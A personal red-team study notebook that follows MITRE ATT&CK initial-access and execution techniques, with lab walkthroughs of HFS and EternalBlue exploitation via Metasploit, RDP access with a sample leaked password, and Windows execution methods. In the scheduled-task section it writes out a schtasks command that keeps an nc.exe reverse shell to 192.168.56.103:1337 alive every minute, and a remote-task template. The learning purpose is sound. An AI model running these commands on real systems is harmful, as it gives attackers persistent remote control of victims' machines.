# Introduction

Well in this new book I will start to learn some Red Team Topics, and I will work on learning as much as possible, I will try to keep this updated, to newer things that I may find, I think this will help around in my future projects. I am following the MITRE ATTACK Framework and just adapting it to something for me to understand, I will make this public for anyone that want's to learn in this awesome field. If anything is wrong I will try my best to fix it.

This is currently my way of just learning things, and you know, practice makes perfect right?; and what better way than screenshots and videos to explain it to myself, and others. I'm especially trying to "dumb it down" for myself since sometimes, just starting in a new field can be very exhausting by just trying to "guess" what to learn and what to be searching for. This will probably help in shortening the learning process. 

I will try and keep this as accurate as possible, with some examples of how the technique works. Nothing advanced this is just the basics and hopefully, well in the future it will help some to understand what "Key Words" or areas to search for when trying to find more sophisticated articles.

it's been a year since an update and here it is!!.

# red-team

A Red Team Assessment is similar to a penetration test in many ways but is more targeted. The goal of the Red Team Assessment is NOT to find as many vulnerabilities as possible. The goal is to test the organization's detection and response capabilities. The red team will try to get in and access sensitive information in any way possible, as quietly as possible. The Red Team Assessment emulates a malicious actor targeting attacks and looking to avoid detection, similar to an Advanced Persistent Threat (APT). Red Team Assessments are also normally longer in duration that Penetration Tests. A Penetration Test often takes place over 1-2 weeks, whereas a Red Team Assessment could be over 3-4 weeks or longer, and often consists of multiple people.

A Red Team Assessment does not look for multiple vulnerabilities but for those vulnerabilities that will achieve their goals. The goals are often the same as Penetration Test. Methods used during a Red Team Assessment include Social Engineering (Physical and Electronic), Wireless, External, and more. A Red Team Assessment is NOT for everyone though and should be performed by organizations with mature security programs. These are organizations that often have penetration tests done, have patched most vulnerabilities, and have generally positive penetration test results.

Source: 

[Rapid7](https://blog.rapid7.com/2016/06/23/penetration-testing-vs-red-teaming-the-age-old-debate-of-pirates-vs-ninja-continues/)

​

# initial-access

The adversary is trying to get into your network

Initial Access consists of techniques that use various entry vectors to gain their initial foot hold within a network. Techniques used to gain a foothold include targeted spear phishing and exploiting weaknesses on public-facing web servers. Foot holds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.

​

## t1190-exploit-public-facing-applications

Adversaries may attempt to take advantage of a weakness in an internet-facing computer or program using software, data or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services. Depending on the flaw being exploited his may include Exploitation for Defense Evasion.

If an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow ad adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.

For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.

​

[OWASP TOP 10](https://owasp.org/www-project-top-ten/)

### rejetto-http-file-server-hfs-2.3

You can use HFS (HTTP File Server) to send and receive files.

It's different from classic file sharing because it uses web technology to be more compatible with today's Internet. It also differs from classic web servers because it's very easy to use and runs "right out-of-the-box". Access your remote files, over the network. It has been tested with Wine under Linux.

**CVE-2014-6287**

The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aka HFS or HTTP Fileserver) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

Let's test it.

**Recon**

We will have an instance on HFS running in our victim host.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh3bNv4cwjS8C9kaE4%2F-MRh3pHBxfeg5w6buLJ5%2Fimage.png?alt=media&token=101a898d-7822-426c-9b51-be17c6e2f1ee)

From our attacking machine we will do a simple nmap scan and check our open ports, we know the server is running on port 80 but as an attacker we usually go in blind (Black Box). As well we don't want to flood it with so much request so we can always use nmaps safe scripts to check our victim host in a proper way. Let's cheat on this example and run the scan just on port 80.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh3bNv4cwjS8C9kaE4%2F-MRh3qnYZ9R0LobH5UUy%2Fimage.png?alt=media&token=aa7cad8e-3420-40e6-96e2-ec30f305d4e1)

Let's imagine that this is a Public facing IP Address, and we find our Web Server running HFS, let's enumerate this service as we are currently unaware if there is even an exploit!!.

Google:

The first 3 searches shows us some promising results

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh3bNv4cwjS8C9kaE4%2F-MRh3s2GsLbr9_dMsT1P%2Fimage.png?alt=media&token=584f8644-9ff4-4f64-bf47-16f0850c34a7)

Let's not go too far Offensive Security has this incredible tool to search for exploits locally on our machine with no internet [searchsploit].

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh3bNv4cwjS8C9kaE4%2F-MRh3tBJzAc9jzDrwLSe%2Fimage.png?alt=media&token=b4556525-1155-4720-bedf-8bf29f7f1f46)

What about the famous hacker framework Metasploit.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh3bNv4cwjS8C9kaE4%2F-MRh3uC5_OKlYYtxViS9%2Fimage.png?alt=media&token=6ac1be96-5658-4f02-bd4f-f619593ec02f)

A great option we can use this tool to catch a shell immediately, we try to do this in a most efficient matter, why not use a tool that has been properly tested (Manual hackers out there).

**Exploit**

With Metasploit we set our proper options to attack this machine and gain a shell. Usually we want to set the following variables

RHOSTS

LHOST

The rest is set to the proper port and path. Then we simply run the payload.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh3bNv4cwjS8C9kaE4%2F-MRh3viKbR1aP9tyICHD%2Fimage.png?alt=media&token=f397e09d-90b9-4228-93f2-0f0f0479ec7d)

And we can see our permission from the machine with Metasploit try and Privesc and other good things on the machine. But this is just an example with how some public facing application can give the APT Initial Access to the Internal Network when this is facing the Public Internet.

## untitled

Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management can also be used externally.

Access to 

[Valid Accounts](https://attack.mitre.org/techniques/T1078)

 to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credential from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.

### smb-windows-admin-shares

Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares.

Windows systems have hidden network shares that are accessible only to Administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMINS$ and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution.

Boy is this one a famous one (WannaCry), this port now uncommon but not dead is still facing the public internet (do your recon if you don't believe me). This port is another common service offered by operating systems, it allows us to share files across the network with ease, but it also allows attackers to gain access to machines and even move laterally through the network!!(More on that later).

**Recon**

We start with our nmap scan to find the service running on the Operating System we are aware that the service runs on port 445 so we will focus on this one on our initial enumeration.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh2QNYx2eiRuvmoAH6%2F-MRh2it6NCJMPBxqIbYa%2Fimage.png?alt=media&token=6702a5ba-b153-4aeb-93a7-4b23d002f086)

We see our port and service open and running with some enumeration we can find that this service is vulnerable to Eternalblue Exploit. This was a very known vulnerability leaked by Shadow Brokers in 2017 and developed by the NSA. It has been properly tested and developed on the Metasploit Framework (please do try and manually exploit this as there are many around flying on github). We will use this to gain a shell and access on to the machine.

But!!, let's be honest even though we are having and simulating an APT let's be CAREFUL when using these exploits as they are well known to crash servers, YES, YES they have been tested and properly configured to work on the framework but computers are so random that you don't even know if this will work, it is always best and of good practice to replicate the environment in a Virtual Machine and TEST your exploits THERE!!.

We verify our variables that are set onto Metasploit and execute the Exploit and we get a Shell.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh2QNYx2eiRuvmoAH6%2F-MRh2lXoQkEge4fv1XEZ%2Fimage.png?alt=media&token=dbc9730f-e921-48f9-a22f-cca06821055a)

And it's SYSTEM Access. This was another great example of Services facing the public internet and how attackers can leverage this vulnerabilities and gain access to the network. With some proper enumeration and the correct tools we can find these vulnerabilities on the targeted machine and be able to gain access to the PC.

Remember even though this was a very dangerous vulnerability and it's not seen in the wild anymore, well not as often it is unfortunately still out there.

### rdp-service

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS)

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.

Sometimes we need to access our PC from a remote location due to situations that are out of our control, but Windows made it simple to allow RDP Connections to our PC through the RDP Service. (Pro to Enable, Home only allows Connection). And we will initiate our RDP Service to point a Public IP Address so that we can Access our Internet Network from a remote location.

Here in a work perspective is great in an Attacker perspective this is even greater, the only thing that stops them is too find any Valid Accounts that can give them access to the service. There are some public exploits but have a few requirements for them to be successful. Some need to run a specific service (UltraVNC, TightVNC, etc.) Other need older OS (Windows XP, Vista, 7).

**Recon**

Let us start with a simple nmap scan these services run on specific ports(unless changed) RDP is known for running on port 3389 we will focus our scan on this specific port and see what information we can grab from this port.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh1v8RteY_RojQPqSo%2F-MRh2BpocMNYr40z-gFq%2Fimage.png?alt=media&token=87f4094e-b777-40f7-a6ab-db5d2de6ffbb)

We continue by searching for accounts or common passwords that can give us some access to this services, in this step we can use many techniques such as OSINT, Phishing, Leaked Databases, etc. These will be helpful to find users or credentials for trying out on the External Remote Services available from a company that is facing the public internet.

**Exploitation**

Well on this attack we won't be using any exploits but this attack consists mostly on having some Valid Accounts with RDP Permissions or Administrator Account Privileges, these accounts are usually the ones capable of remote access through RDP.

But in this example we did our recon and found some old credentials leaked in a previous Database.

User: John

Password: P4$W0rd123!

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh1v8RteY_RojQPqSo%2F-MRh2EJwMPa5YF64JuR6%2Fimage.png?alt=media&token=3d6a7df5-4c0b-40c4-9b3a-5ffb4cdc7384)

And finally after some hard work we manage to get Access through our RDP Service that we found in our Initial Recon, this is another great example not common but still out there, that can give attackers access to the internal network.

## t1566-phishing

Adversaries may send phishing messages to gain access to victims systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.

Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of Valid Accounts. Phishing may also be conducted via third-party services, like social media platforms.

### phishing-spearphishing-via-service

In this scenario, adversaries send messages through social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

### phishing-spearphishing-link

Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of link to download malware contained in an email itself, to avoid defenses that may inspect email attachments.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.

It is a different form of spearphishing that employs links to download malware contained in email, instead of attaching malicious files to the documents itself, to avoid defenses that may inspect the email attachments.

### phishing-spearphishing-attachment

Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.

There are many options for the attachment such as Microsoft Office documents , executables, PDFs, or archived files. Upon opening the attachment ( and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.

**Mitigations**

**Antivirus/Antimalware**

Anti-virus con also automatically quarantine suspicious files.

**Network Intrusion Prevention**

Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.

** Restrict Web-Based Content**

Block unknown or unused attachments by default that should not be transmitted over email as best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc.

## t1195-supply-chain-compromise

Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.

Supply chain compromise can take place at any stage of the supply chain including:

Manipulation of development tools

Manipulation of a development environment

Manipulation of Source Code repositories (public or private)

Manipulation of source code in open-source dependencies

Manipulation of software update/distribution mechanisms

Compromise/infected system images (multiple cases of removable media infected at the factory)

Replacement of legitimate software with modified versions

Sales modified/counterfeit products to legitimate distributors

Shipment interdiction

While supply chain compromise can impact any component of hardware or software, attackers are looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.

### compromise-hardware-supply-chain

Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as workstations, network infrastructure, or peripherals.

### compromise-software-supply-chain

Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.

### compromise-software-dependencies-and-development-tools

Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in  many applications may be targeted as a means to add malicious code to users of the dependency.

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.

## t1078-valid-accounts

Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be abused to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and Remote Desktop. Compromised Credentials may also grant an adversary increased privilege  to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction provide to make it harder to detect their presence.

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e.: domain or enterprise administrators) to bypass access controls set within the enterprise.

### local-accounts

Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support , services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.

### domain-accounts

Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services when access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.

Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.

### default-accounts

Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.

Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.

## t1199-trusted-relationship

Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted party relationship exploits an existing connection that may not be protected or receive less scrutiny that standard mechanisms of gaining access to a network.

Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HAVEC, elevators, physical security.) The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise.

# execution

The adversary is trying to run malicious code.

Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.

Most of these techniques do not require a Tool but just access and Native Tools from the Windows Machine itself one of the reasons we want to use Execution on Windows-Signed Binaries is to mainly avoid detection or:

1

Avoid creating new processes/network connections

2

Avoid creating anomalous parent/child relationships

3

Avoid creating/modifying files/registry entries

4

Avoid creating memory anomalies

5

Avoid leaving evidence in log files

Copied!

## t1047-windows-management-instrumentation

Adversaries may abuse Windows Management Instrumentation (WMI) to achieve code execution. WMI is a Windows Administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.

Very awesome things we can do with wmic(Command-Line), in a local and/or remote manner.

Let's enumerate locally we can grab valued info such as Name, Manufacturer, Model, Domain and a Description

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGZDlTT-Bx0PhG1cU%2F-MRhG_o5wjyq0DEzo18o%2Fimage.png?alt=media&token=47f1fa13-5ca8-45cc-9d03-0ded95e7f5ca)

Environment

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGZDlTT-Bx0PhG1cU%2F-MRhGaVf8qMgGI_tDOCo%2Fimage.png?alt=media&token=91caadaa-a45e-446d-ab10-1640d8cd015e)

Users, Groups

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGZDlTT-Bx0PhG1cU%2F-MRhGbKoyC1drTQqD_vc%2Fimage.png?alt=media&token=ea900110-d117-49ec-b7fc-38a24f8241fc)

Missing patches:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGZDlTT-Bx0PhG1cU%2F-MRhGcDaeG6sNKtGLPAP%2Fimage.png?alt=media&token=5864f47b-c403-461e-aebf-aacf73dfe532)

Execution of an XSL File

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGZDlTT-Bx0PhG1cU%2F-MRhGczo03lR4c8LBxVJ%2Fimage.png?alt=media&token=e3b369d5-794d-457b-82a6-72122e307bc5)

Execution, we can create a process and execute code

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGZDlTT-Bx0PhG1cU%2F-MRhGdgvTnfwk5-vVsCO%2Fimage.png?alt=media&token=0b4b87ac-1bf7-43d5-b55d-75412e3fb8e8)

Wmic is proxy aware so it can also call xsl file from remote host that can contain our payloads. This is a great method to avoid logs as it is very uncommon to be used and OPSEC safe for environments.

## t1204-user-execution

An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.

### malicious-file

An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl.

Adversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.

While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.

There are so many files available for gaining Execution on our target machine and creating payloads for them is just not possible to follow one methods since there are plethora of ways to create these and using different languages, but here I recommend a GitHub page with some POC of these famous extensions and are harmless as they only pop calc.exe

​

[https://github.com/arntsonl/calc_security_poc](https://github.com/arntsonl/calc_security_poc)

### malicious-link

An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clocking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.

I will not demonstrate this one as we already have an idea of what is going on by checking Initial Access in the Spearphishing Section.

## t1569-service-execution

Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities as sc.exe and Net.

PsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.

Adversaries may leverage these mechanisms to execute malicious content. This can be done either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.

Example:

An example as mentioned previously is we can use PsExec. Psexec drops a binary into the $ADMIN SMB Share and uses service.exe to execute that binary and gain execution

But to run PsExec first we need to meet certain requirements such as:

1.       

**Server Message Block**

 (SMB) must be available and reachable. i.e. not blocked by firewall.

2.       

**"File and Print Sharing"**

 must be enabled.

3.       

**"Simple File Sharing"**

 must be disabled.

4.       

**Admin$**

 share must be available and accessible. (Admin$ share is a hidden SMB share that maps to the Windows directory, and is intended for software deployments. The creds supplied to PSEXEC must be able to access the Admin$ share.)

An example of PsExec running for the first time by using the "-accepteula" parameter that creates a Registry Key so be careful when leaving tracks. Also this will elevate our permissions to SYSTEM.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkA_-C-cNGByvy9xI6%2F-MRkAf8-KnTFbvp__NFB%2Fimage.png?alt=media&token=9687d038-9e63-45b7-bccc-5bf756863244)

## t1053-scheduled-tasks-job

Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified data and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).

Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.

Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).

### shared-modules

Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess, Loadlibrary, etc. of the Win32 API.

The module loader can load DLLs:

Via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;

Via Export forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);

Via an NTFS junction or symlink program.exe.lcaol with the fully-qualified or relative pathname of a directory containing DLLs specified in the IMPORT directory or forwarded EXPORTS;

Via <file name=filename.extension" loadfrom="fully-qualified or relative pathname"> in an embedded or external application manifest". The file name refers to an entry in the IMPORT directory or forwarded EXPORT.

Adversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.

### scheduled-task

Utilities such as 

**at**

 and 

**schtasks**

, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on.Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system.

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct a remote Execution as part of Lateral movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

Let's create a task that keep a reverse shell alive every minute.

schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhDVj4APC12TCWJPB2%2F-MRhEQK9QNp0tVKNgVBn%2FSCHTASK-nc.gif?alt=media&token=9e562315-02a3-46bc-900d-2ec81da447e2)

As we can see here creating a task can be done with a simple syntax and I demonstrated with nc.exe binary which takes also arguments!, all that was needed is to be inside the double-quotes ("") and it will take arguments with spaces.These tasks can also be created remotely. All that is needed is the user to be an administrator or have proper permissions on the Remote machine.

In the schtasks help menu we see the arguments needed after 

/create

 to create a task on a remote server. We can supply the username and password on the arguments to authenticate and create the task.

It would look something like this.

schtasks /create /s "PC-NAME" /tn "My App" /tr "PATH" /sc minute /mo 1 /u Domain\User /p password

 [If password is not supplied it will prompt asking for one]

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhDVj4APC12TCWJPB2%2F-MRhEUZkWu1rQnvbkGlO%2Fimage.png?alt=media&token=39296749-aeef-4004-bce1-77ad91bde043)

### at-windows

Adversaries may abuse the at.exe utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.

An adversary may use at.exe in Windows environments to execute programs at system startup or on scheduled basis for persistence. At can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).

Note: The at.exe command line utility has been deprecated in current versions of Windows in favor of schtasks.

Sample:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkAgCETyyyshu4OELI%2F-MRkAkyTkXLnf4aVfjkt%2Fimage.png?alt=media&token=7e5f6a80-2e7d-488f-8e2c-b2dc9715d530)

## t1106-native-api

Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These framework typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.

Adversaries may abuse these native API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.

## t1559-inter-process-communication

Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPS is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.

Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Higher level execution medium, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms.

### dynamic-data-exchange

Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Objecting Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry Keys.

